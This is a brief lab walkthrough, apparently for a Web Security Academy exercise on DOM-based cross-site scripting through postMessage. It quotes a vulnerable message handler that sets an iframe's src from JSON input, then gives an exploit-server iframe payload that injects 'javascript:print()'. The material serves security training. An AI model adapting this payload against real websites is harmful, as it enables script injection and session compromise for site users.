```bash

1. open the lab
2. navigate to the view page source
3. ctrl f
4. search: event

                    <script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
                    </script>

 5. navigate to the exploit server

 PAYLOAD

 {
   "type": "load-channel",
   "url": "javascript:print()"
 }

 <iframe src="https://0ac900a60487fc51e6e9ffbb009200ae.web-security-academy.net/" onload='this.contentWindow.postMessage(`{"type": "load-channel","url": "javascript:print()"}`,"*")'></iframe>

```
